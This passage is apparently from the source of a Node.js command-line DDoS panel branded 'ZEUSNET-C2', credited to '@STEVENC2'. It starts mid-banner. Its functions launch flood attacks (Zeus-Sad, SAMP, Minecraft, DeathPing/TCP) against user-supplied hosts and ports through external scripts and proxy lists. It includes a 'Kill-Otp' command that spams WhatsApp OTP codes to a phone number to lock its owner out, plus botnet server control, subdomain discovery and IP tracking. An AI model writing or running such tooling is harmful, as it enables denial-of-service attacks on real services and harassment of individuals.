⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀ \x1b[1;31m       Status: [\x1b[1;94m Attack Sent Successfully All Server \x1b[1;31m]
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀  \x1b[1;31m      Host: [\x1b[1m\x1b[95m ${target} \x1b[1;31m]
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄  \x1b[1;31m      Port: [\x1b[1m\x1b[95m 443 \x1b[1;31m]
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇  \x1b[1;31m      Time: [\x1b[1m\x1b[95m ${duration} \x1b[1;31m]
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃   \x1b[1;31m     Methods: [\x1b[1m\x1b[95m Zeus-Sad \x1b[1;31m]
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀          \x1b[1;31m  \x1b[95m\x1b[47mTarget Details\x1b[0m
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ASN : [\x1b[1m\x1b[95m ${result.as} \x1b[1;31m]
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      ISP : [\x1b[1m\x1b[95m ${result.isp} \x1b[1;31m]
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀   \x1b[1;31m      IP : [\x1b[1m\x1b[95m ${result.query} \x1b[1;31m]
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿                     \x1b[1;31m    \x1b[95m\x1b[47mCREDITS\x1b[0m
                                  \x1b[1;31m Owner   : [ @STEVENC2 \x1b[1;31m]
`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/zeus-sad.js`);
exec(`node ${metode} ${target} ${duration} 65 10 proxy.txt`)
sigma()
};
// [========================================] //
async function killOTP(args) {
  if (args.length < 2) {
    console.log(`Example: Kill-Otp <Target> <Duration>
Kill-Otp 628xxx 120`);
    sigma();
	return
  }
const [target, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${bold}${cyan}OTP Killer Has Been Launched${Reset}
========================================================================
${bold}${cyan}Target${Reset}   : ${target}
${bold}${cyan}Duration${Reset} : ${duration}

${bold}${cyan}Spamming WhatsApp OTP That Can Annoy Someone Or Maybe Make Them Cannot Login${Reset}`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/temp.js`);
exec(`node ${metode} +${target} ${duration}`)
sigma()
};
// [========================================] //
async function samp(args) {
  if (args.length < 3) {
    console.log(`Example: Samp <Target> <Port> <Duration>
Samp 123.456.78.910 7777 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${bold}${cyan}SAMP Flood Attack Launched${Reset}
========================================================================
${bold}${cyan}STATUS${Reset}   : \x1b[94mAttack Has Successfully Launched\x1b[0m
${bold}${cyan}Target${Reset}   : ${target}
${bold}${cyan}Duration${Reset} : ${duration}
${bold}${cyan}Methods  : Samp Flood${Reset}
${bold}${cyan}Owner Tools  : @STEVENC2${Reset}`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/samp.js`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function mc(args) {
  if (args.length < 3) {
    console.log(`Example: Mc <Target> <Port> <Duration>
Mc 123.456.78.910 7777 300`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${bold}${cyan}SAMP Flood Attack Launched${Reset}
========================================================================
${bold}${cyan}STATUS${Reset}   : \x1b[94mAttack Has Successfully Launched\x1b[0m
${bold}${cyan}Target${Reset}   : ${target}
${bold}${cyan}Duration${Reset} : ${duration}
${bold}${cyan}Methods  : Mc Flood${Reset}
${bold}${cyan}Owner Tools  : @STEVENC2${Reset}`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
    sigma()
}
const metode = path.join(__dirname, `/lib/cache/mc.js`);
exec(`node ${metode} ${target} ${port} ${duration}`)
sigma()
};
// [========================================] //
async function DeathPing(args) {
  if (args.length < 3) {
    console.log(`Example: DeathPing <Target> <Duration>
DeathPing 123.456.78.910 120`);
    sigma();
	return
  }
const [target, port, duration] = args
try {
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${bold}${cyan}DeathPing Flood Attack Launched${Reset}
========================================================================
${bold}${cyan}STATUS${Reset}   : \x1b[94mAttack Has Successfully Launched\x1b[0m
${bold}${cyan}Target${Reset}   : ${target}
${bold}${cyan}Duration${Reset} : ${duration}
${bold}${cyan}Methods  : DeathPing Flood${Reset}
${bold}${cyan}Owner Tools  : @STEVENC2${Reset}`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
}

const metode = path.join(__dirname, `/lib/cache/tcp.js`);
const sadboy = path.join(__dirname, `/lib/cache/sadboy.js`);
exec(`node ${metode} ${target} ${port} ${duration} 10`)
exec(`node ${sadboy} http://${target} ${duration}`)
sigma()
};
// ================================================== //
async function subdomen(args) {
  if (args.length < 1) {
    console.log(`Example: Subdo-Finder Domain
Subdo-Finder starsx.tech`);
    sigma();
	return
  }
const [domain] = args
try {
let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${domain}`);
let hasilmanuk = response.data.data.map((data, index) => {
return `${data}`;
}).join('\n');
console.clear()
console.log(`
⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${bold}${cyan}Subdomains Finder${Reset}
Type ${bold}${biru}"Cls"${Reset} To Clear Terminal
========================================================================
${hasilmanuk}`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
  sigma()
}
sigma()
};
// ================================================== //
async function chat_ai() {
steven.question('[\x1b[1m\x1b[95m Chat AI\x1b[0m]: \n', async (yakin) => {
if (yakin === 'exit') {
  console.log(`Chat Ai Has Ended`)
  sigma()
} else {
  try {
let skidie = await axios.get(`https://widipe.com/gpt4?text=${yakin}`)
let kiddies = await skidie.data
console.log(`
[ ZEUSNET-C2 ]:
${kiddies.data}
`)
  } catch (error) {
      console.log(error)
  }
  chat_ai()
}})
}
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/StevenBisnis22/cache/refs/heads/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣶⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣄⠀⠀⠀⠀⠀
⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣆⠉⠉⢉⣿⣿⣿⣷⣦⣄⡀⠀
⠀⠚⢛⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄
⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠿⠿⠿⣿⡇
⢀⣿⡿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠈⠃
⠸⠁⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣿⣿⣿⡿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⣿⣿⡇⠈⠻⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⡇⠀⠀⠈⠙⠿⣿
====================================================================
Created And Coder Full By @STEVENC2`
steven.question(
'\x1b[91mZ\x1b[93mE\x1b[92mU\x1b[96mS\x1b[94mN\x1b[95mE\x1b[97mT\x1b[91m-\x1b[93mC\x1b[92m2\x1b[0m ', (input) => {
    const [command, ...args] = input.trim().split(' ');

  if (command === 'help') {
    console.log(`
NAME      │ ALIAS              │ DESCRIPTION
──────────┼────────────────────┼────────────────────────────────────
 help     │ ----               │ Melihat Semua Command
 methods  │ ----               │ Melihat Semua Methods
 botnet-methods | ----         | Melihat Semua Methods Botnet
 proxy    | ----               | Update Proxy Pada Tools ZEUSNET-C2
 track-ip | ----               | Track Ip Address With Info
 subdo-finder │ ----           | Find All Subdomain From Domain
 ongoing  │ ----               │ Melihat Server Serangan Anda
 tutorial │ ----               │ Tutorial Penggunaan Tools ZEUSNET-C2
 credits  │ ----               │ Credits Tools ZEUSNET-C2
 news     │ ----               │ Melihat News Update Tools ZEUSNET-C2
 cls      | ----               | Clear Terminal Tools ZEUSNET-C2
`);
    sigma();
  } else if (command === 'botnet-methods') {
  	console.log(`
█░░ ▄▀█ █▄█ █▀▀ █▀█ ▀▀█     
█▄▄ █▀█ ░█░ ██▄ █▀▄ ░░█ 

──────────────────────[SERVER OPERATIONS]──────────────────────
   • botnet       - Launch Attack With Server
   • botnet-test  - Check Server Status
   • addsrv      - Add New Server
┌────────────────────────────┐
│         Attack Modes       │
├────────────────────────────┤
│ ➤ zeus-flood         │ ➤ zeus-tls    │
│ ➤ zs-browser         │ ➤ zs-bypass   │ 
│ ➤ zeus-flash         │ ➤ zeus-love   │
│ ➤ zeus-raw           │ ➤ zeus-sad    │
└────────────────────────────┘

`);
    sigma();
  } else if (command === 'methods') {
    methods()
    sigma();
  } else if (command === 'proxy') {
    exec('node ./tools/scrape.js', (error, stdout, stderr) => {
        if (error) {
            console.error(`Error: ${error.message}`);
            return;
        }
        if (stderr) {
            console.error(`stderr: ${stderr}`);
            return;
        }
        console.log(`stdout: ${stdout}`);
    });
    
    sigma();
  } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'gataulah') {
    handleAttackCommand(args);
  } else if (command === 'tutorial') {
  	console.log(`
 Tutorial Menggunakan
 Methods Target Port Time
 Contoh => Zeus-Tls https://website.com 443 60`);
    sigma();
  } else if (command === 'udp') {
    udp(args);
  } else if (command === 'tcp') {
    tcp(args);
  } else if (command === 'zeus-flood') {
  	zeus_flood(args);
  } else if (command === 'zeus-tls') {
  	zeus_tls(args);
  } else if (command === 'zs-browser') {
  	zs_browser(args);
  } else if (command === 'zs-bypass') {
  	zs_bypass(args);
  } else if (command === 'zeus-flash') {
  	zeus_flash(args);
  } else if (command === 'zeus-love') {
  	zeus_love(args);
  } else if (command === 'zeus-raw') {
  	zeus_raw(args);
  } else if (command === 'zeus-sad') {
  	zeus_sad(args);
  } else if (command === 'kill-do') {
  	killDo(args);
  } else if (command === 'samp') {
  	samp(args);
  } else if (command === 'subdo-finder') {
    subdomen(args)
  } else if (command === 'kill-otp') {
  	killOTP(args);
  } else if (command === 'DeathPing') {
  	DeathPing(args);
  } else if (command === 'spampair') {
  	SpamPair(args);
  } else if (command === 'kill-ping') {
    pod(args);
    } else if (command === 'addsrv') {
    processBotnetEndpoint(args);
  } else if (command === 'botnet-test') {
    checkBotnetEndpoints()
  } else if (command === 'botnet') {
    AttackBotnetEndpoints(args);
  } else if (command === 'ongoing') {
    ongoingAttack()
    sigma()
  } else if (command === 'track-ip') {
    trackIP(args);
  } else if (command === 'mc') {
    mc(args);
  } else if (command === 'ai') {
    console.log(`STEVENC2 Ai ZEUSNET-C2 Started
Type "Exit" To Stop Chat`);
    chat_ai()
  } else if (command === 'cls') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearProxy()
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()